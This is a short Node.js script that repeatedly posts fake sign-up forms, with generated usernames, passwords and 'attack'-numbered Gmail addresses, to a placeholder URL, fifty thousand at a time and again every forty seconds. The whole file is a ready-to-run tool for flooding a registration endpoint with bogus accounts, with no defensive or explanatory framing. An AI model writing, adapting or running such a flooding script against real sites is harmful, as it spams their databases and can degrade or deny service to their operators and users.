var request = require('request');
var uniqid = require('uniqid');

async function send(){
    var i = 0;
    while(i < 50000){

        var defautData = uniqid();
        var mail = "attack" + i + "@gmail.com";
        var Birthday = "09071982";

        await sendData(defautData,mail,Birthday);
        i++;
    }
}


setInterval(send, 40000);

async function sendData(defautData,mail,Birthday){
    request.post({
      headers: {'content-type' : 'application/x-www-form-urlencoded'},
      url:     'http://uri.com:80',
      form:    { sumbit: "attack",username:defautData,birthday:Birthday,Password: defautData,email:mail}
    }, function(error, response, body){
        if(!error) {
            console.log("Done. " + defautData);
        }
        else {
            console.log(error);
        }
            
    });
}
